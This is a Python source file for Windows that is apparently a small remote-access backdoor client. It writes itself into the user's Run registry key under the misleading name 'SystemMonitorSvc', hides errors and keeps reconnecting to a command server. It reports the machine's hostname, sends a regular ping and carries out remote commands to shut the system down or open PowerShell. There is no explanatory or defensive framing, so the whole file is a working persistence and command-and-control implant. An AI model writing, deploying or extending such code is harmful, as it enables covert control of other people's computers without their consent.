import socket
import os
import sys
import winreg
import time
import threading

SERVER_IP = '127.0.0.1'
SERVER_PORT = 4001

def add_to_startup():
    try:
        script_path = os.path.abspath(__file__)
        python_exe = sys.executable
        autorun_val = f'"{python_exe}" "{script_path}"'
        key = winreg.OpenKey(
            winreg.HKEY_CURRENT_USER,
            r"Software\Microsoft\Windows\CurrentVersion\Run",
            0, winreg.KEY_ALL_ACCESS
        )
        winreg.SetValueEx(key, "SystemMonitorSvc", 0, winreg.REG_SZ, autorun_val)
        winreg.CloseKey(key)
    except Exception:
        pass

def listen_for_commands(sock):
    while True:
        try:
            data = sock.recv(1024).decode('utf-8')
            if not data: break
            if data == "CMD:SHUTDOWN":
                print("System switching off . . .")
                os.system("shutdown /s /t 5")

            elif data == "CMD:POWERSHELL":
                print("System opens powershell . . .")
                os.system("start powershell")

        except Exception as e:
            break

def start_client():
    hostname = socket.gethostname()
    while True:
        try:
            client = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
            client.connect((SERVER_IP, SERVER_PORT))
            client.send(hostname.encode())
            listener = threading.Thread(target=listen_for_commands, args=(client,), daemon=True)
            listener.start()
            while True:
                client.send(b"PING")
                time.sleep(5)
        except Exception:
            time.sleep(5)
        finally:
            try:
                client.close()
            except:
                pass

if __name__ == "__main__":
    add_to_startup()
    start_client()